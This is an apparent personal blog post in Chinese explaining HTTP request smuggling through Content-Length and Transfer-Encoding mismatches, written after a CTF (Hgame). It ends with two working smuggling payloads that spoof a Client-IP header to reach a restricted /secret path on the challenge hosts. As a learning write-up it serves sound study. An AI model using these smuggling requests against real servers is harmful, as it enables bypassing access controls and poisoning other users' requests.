@@ -1,0 +1,223 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>http走私 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="也是在Hgame里面遇见了才学习到，http走私产生的原因很简单，就是因为HTTP协议提供两种方式来决定结束的方式，分别有 Content-Length标头和Transfer-Encoding标头，,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">http走私</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">http走私</h1>
+        <div class="stuff">
+            <span>二月 07, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>也是在Hgame里面遇见了才学习到，http走私产生的原因很简单，就是因为HTTP协议提供两种方式来决定结束的方式，分别有 <code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头，Content-Lenth我们一般见得多，它以字节为单位指定消息内容体的长度，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line">a=11</span><br></pre></td></tr></table></figure>
+
+<p><code>Transfer-Encoding</code>标头用于指定消息体使用分块编码（Chunked Encode），也就是说消息报文由一个或多个数据块组成，每个数据块大小以字节为单位（十六进制表示） 衡量，后跟换行符，然后是块内容，最重要的是：整个消息体以大小为0的块结束，也就是说解析遇到0数据块就结束。如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">b</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">a=11</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>
+
+<p>其实理解起来漏洞真的很简单，就是前后端对于HTTP结束的规定不同，比如前端可能读取到Content-Length就认为这段请求结束了，而整个请求包被发送过去的时候后端读取到了Transfer-Encoding，认为到这结束，所以两者就处理不同了。</p>
+<p>那么就可能产生如下几种不同情况：</p>
+<h3 id="前端处理Content-Length-后端不处理"><a href="#前端处理Content-Length-后端不处理" class="headerlink" title="前端处理Content-Length,后端不处理"></a>前端处理Content-Length,后端不处理</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/secret</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> police.liki.link</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，前端处理到Content-Lenth之后就会停下，但是后端并不会，继续处理后半段的请求。</p>
+<h3 id="前后端处理CL方式不同"><a href="#前后端处理CL方式不同" class="headerlink" title="前后端处理CL方式不同"></a>前后端处理CL方式不同</h3><p>当请求中出现两个CL的时候，前后端的处理方式不同也会导致漏洞诞生，例子：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 89</span><br><span class="line"><span class="attribute">Content-Length</span>: 90</span><br><span class="line"></span><br><span class="line">(中间略过)</span><br><span class="line"><span class="attribute">123456</span></span><br><span class="line"><span class="attribute">78</span></span><br></pre></td></tr></table></figure>
+
+<p>假设到78前面正好为89个字符的话，比如像这样一个请求，前端读取第一个CL认为请求体包括了<code>12345\r\na</code>，而后端读取第二个CL，认为请求体只包括到了<code>12345\r\n</code>。于是后面的<code>a</code>就到了缓冲区之中，当又有用户进行这样一个访问时：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br></pre></td></tr></table></figure>
+
+<p>就会产生不存在aPOST这种访问方式的错误了</p>
+<h3 id="在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）"><a href="#在http请求中存在CL和TE-Transfer-Encoding-，前端只处理的是CL，后端只处理TE（CL-TE）" class="headerlink" title="在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）"></a>在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）</h3><p>在<code>Transfer-Encoding: chunked</code>下数据格式是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>
+
+<p>分块大小的值在前，后面是分块数据。当到尾部时，分块大小的值为0，然后以<code>\r\n\r\n</code>结束</p>
+<p><a target="_blank" rel="noopener" href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/0b37e16790f1a6bfa7d1cd5c27c7c263.png"><img src="http%E8%B5%B0%E7%A7%81/0b37e16790f1a6bfa7d1cd5c27c7c263.png" alt="img"></a></p>
+<p>像这样的一个请求，前端处理CL后认为请求体为6，包括<code>0\r\n\r\nG</code>。而后端处理TE后，检测到<code>0\r\n\r\n</code>就认为这个请求已经结束了，<code>G</code>就进入了缓冲区。结果就是再发送一个正常的POST请求进来，就会出现没有<code>GPOST</code>请求的错误</p>
+<h3 id="前端只处理TE，后端只处理CL（TE-CL）"><a href="#前端只处理TE，后端只处理CL（TE-CL）" class="headerlink" title="前端只处理TE，后端只处理CL（TE-CL）"></a>前端只处理TE，后端只处理CL（TE-CL）</h3><p><a target="_blank" rel="noopener" href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/6799a8f91dc52f6aa355219bb90435aa.png"><img src="http%E8%B5%B0%E7%A7%81/6799a8f91dc52f6aa355219bb90435aa.png" alt="img"></a></p>
+<p>像这个请求，前端接受后检测到<code>0\r\n\r\n</code>后才认为请求结束，于是就把<code>12\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code>认为是属于请求体的。而后端根据CL值，认为<code>12\r\n</code>请求就结束了，于是连续访问后就会出现没有<code>GPOST</code>请求的错误</p>
+<h3 id="前后端都处理TE"><a href="#前后端都处理TE" class="headerlink" title="前后端都处理TE"></a>前后端都处理TE</h3><p>这时虽然处理相同了，但我们可以通过对TE进行混淆，使得其中一个服务器不处理TE，结果造成<code>TE-CL</code>/<code>CL-TE</code>的http走私</p>
+<p><a target="_blank" rel="noopener" href="http://shifeng-kaze.cn/blog/hgame2021_web_wp/083cea019b778569ca28f634d3e4c46d.png"><img src="http%E8%B5%B0%E7%A7%81/083cea019b778569ca28f634d3e4c46d.png" alt="img"></a></p>
+<p>像这个请求，尝试用两个TE去混淆，使得后端服务器不处理TE只处理CL，造成<code>TE-CL</code>的http走私</p>
+<p>来自博客：<a target="_blank" rel="noopener" href="http://www.shifeng-kaze.cn/index.php/archives/132/#%EF%BC%8C%E5%86%99%E7%9A%84%E7%9C%9F%E5%A5%BD%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AA%E5%81%9A%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BA%AA%E5%BF%B5">http://www.shifeng-kaze.cn/index.php/archives/132/#，写的真好，这里只做自己的纪念</a></p>
+<p>Hgame两道题的Payload：</p>
+<p>第一题：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret  HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">aa:bn</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>第二题：</p>
+<p>这题目和第一题是差不多一样的，只不过是作者为了防止蹭车设置了障碍，你得爆破</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /secret  HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: thief.0727.site</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br><span class="line"><span class="attribute">aa:bn</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br></pre></td></tr></table></figure>
+
+<p>(最后两行的换行符是必需品)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E5%A4%84%E7%90%86Content-Length-%E5%90%8E%E7%AB%AF%E4%B8%8D%E5%A4%84%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">前端处理Content-Length,后端不处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%90%8E%E7%AB%AF%E5%A4%84%E7%90%86CL%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C"><span class="toc-number">2.</span> <span class="toc-text">前后端处理CL方式不同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8http%E8%AF%B7%E6%B1%82%E4%B8%AD%E5%AD%98%E5%9C%A8CL%E5%92%8CTE-Transfer-Encoding-%EF%BC%8C%E5%89%8D%E7%AB%AF%E5%8F%AA%E5%A4%84%E7%90%86%E7%9A%84%E6%98%AFCL%EF%BC%8C%E5%90%8E%E7%AB%AF%E5%8F%AA%E5%A4%84%E7%90%86TE%EF%BC%88CL-TE%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">在http请求中存在CL和TE(Transfer-Encoding)，前端只处理的是CL，后端只处理TE（CL-TE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E5%8F%AA%E5%A4%84%E7%90%86TE%EF%BC%8C%E5%90%8E%E7%AB%AF%E5%8F%AA%E5%A4%84%E7%90%86CL%EF%BC%88TE-CL%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">前端只处理TE，后端只处理CL（TE-CL）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%90%8E%E7%AB%AF%E9%83%BD%E5%A4%84%E7%90%86TE"><span class="toc-number">5.</span> <span class="toc-text">前后端都处理TE</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
